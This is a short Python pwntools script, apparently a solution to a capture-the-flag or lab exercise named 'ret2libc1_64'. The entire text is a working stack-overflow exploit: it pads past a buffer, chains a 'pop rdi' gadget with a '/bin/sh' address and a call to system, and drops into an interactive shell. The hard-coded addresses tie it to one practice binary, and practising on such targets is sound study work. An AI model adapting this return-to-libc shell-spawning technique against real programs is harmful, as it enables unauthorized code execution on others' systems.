from pwn import*
o = process("./ret2libc1_64")
pop_rdi = 0x400613
bin_sh = 0x400634
call_system = 0x40056f
payload = b'a'*0x18
payload += p64(pop_rdi) + p64(bin_sh)    # 设置参数
payload += p64(call_system)
pause()
o.sendline(payload)
o.interactive()
